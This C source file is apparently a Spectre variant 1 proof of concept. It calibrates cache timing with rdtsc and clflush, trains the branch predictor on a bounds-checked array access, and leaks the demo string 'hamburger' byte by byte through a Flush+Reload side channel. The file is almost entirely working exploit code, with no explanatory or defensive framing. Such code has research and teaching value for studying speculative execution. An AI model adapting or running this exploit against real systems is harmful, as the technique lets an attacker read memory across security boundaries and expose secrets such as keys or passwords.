#define _GNU_SOURCE
#include <stdint.h>
#include <ctype.h>
#include <sched.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <setjmp.h>
#include <math.h>
#include <ucontext.h>
#include <time.h>

unsigned int array1_size = 16;
char array1[256] = { 20, };
char array2[256 * 4096];
size_t time_threshold;
uint8_t result = 0;
size_t array[16];
size_t *addr = array + 8;

char *string = "hamburger";

uint64_t rdtsc() {
  uint64_t a = 0, d = 0;
  asm volatile("mfence");
#if defined(USE_RDTSCP) && defined(__x86_64__)
  asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
#elif defined(USE_RDTSCP) && defined(__i386__)
  asm volatile("rdtscp" : "=A"(a), :: "ecx");
#elif defined(__x86_64__)
  asm volatile("rdtsc" : "=a"(a), "=d"(d));
#elif defined(__i386__)
  asm volatile("rdtsc" : "=A"(a));
#endif
  a = (d << 32) | a;
  asm volatile("mfence");
  return a;
}

void maccess(void *p) {
  asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
}

void flush(void *p) {
  asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
}


void vul_code(size_t x)
{
	if(x < array1_size)
		result &= array2[array1[x] * 4096];
}

int check_cached(void *ptr)
{
	uint64_t begin = 0;
	uint64_t finish = 0;

	begin = rdtsc();
	maccess(ptr);
	finish = rdtsc();

	if((finish - begin) < time_threshold)
		return 1;
	else
		return 0;

}

int data_read(size_t addr)
{
	int count = 1000;
	int iteration = 30;
	int i, j, k = 0;
	size_t training_x, x;
	int res = 0;
	size_t malicious_x = (char *)addr - (char *)array1;
	int check_array[256] = { 0, };
	int test_array[100];
	
	//printf("%s\n",(char *)array1 + malicious_x);
	
	for(i = (count -1) ; i > 0; i--)
	{
		for(j=0; j < 256; j++)
			flush(&array2[j * 4096]);
	
		for(j=0; j<256; j++)
			flush(&array1[j]);
	
		training_x = i % array1_size;

		for(j= (iteration-1); j >= 0 ; j--)
		{
			flush(&array1_size);
			for(volatile int z = 0; z<1000; z++){}
			
			x = ((j % 6) -1) & ~0xffff;
			x = (x | (x >> 16));
			x = training_x ^ (x & (malicious_x ^ training_x));

			vul_code(x);		
		}
		
		
		for(k=0; k<256; k++)
			flush(&array2[k * 4096]);
		
		flush(&array1_size);
		vul_code(x);
			
		for(k=0; k<256; k++)
		{
			if(check_cached(&array2[k * 4096]))
			{
				if(k >= 1)
					check_array[k]++;
			}
		}
		
	}

	for(i=0; i<256; i++)
	{
		if(check_array[i] > 700)
			return i;
		
	}
	
	
	return 0;
}

size_t calculate_time_threshold()
{
        uint64_t begin = 0;
        uint64_t finish = 0;
        size_t cache_hit_time = 0;
        size_t cache_miss_time = 0;
        size_t cache_avg_time = 0;
        size_t i = 0;
        size_t count = 100000;
        
        maccess(addr); // make state cached
        for(i = 0; i<count; i++)
        {
                begin = rdtsc();
                maccess(addr);
                finish = rdtsc();
                cache_hit_time += (finish - begin);
        }

        cache_hit_time /= count;

        flush(addr); //make state uncached

        for(i=0; i<count; i++)
        {
                begin = rdtsc();
                maccess(addr);
                finish = rdtsc();
                flush(addr);
                cache_miss_time += (finish - begin);
        }

        cache_miss_time /= count;

        cache_avg_time = ((cache_hit_time * 5 + cache_miss_time * 2) / 7);

	//printf("hit time is %d\n",cache_hit_time);
	//printf("miss_time is %d\n",cache_miss_time);
	
        return cache_avg_time;
}


int main(int argc, const char **argv)
{
	int i;
	int value;
	time_threshold = calculate_time_threshold();
		
	//printf("array1 address is : %p\n", array2);
	//printf("string address is : %p\n", string);	
	
	for(i=0; i<strlen(string); i++)
	{
		value = data_read((size_t)(string + i));
		printf("%c",value);
		//fflush(stdout);
	}

	return 0;
}
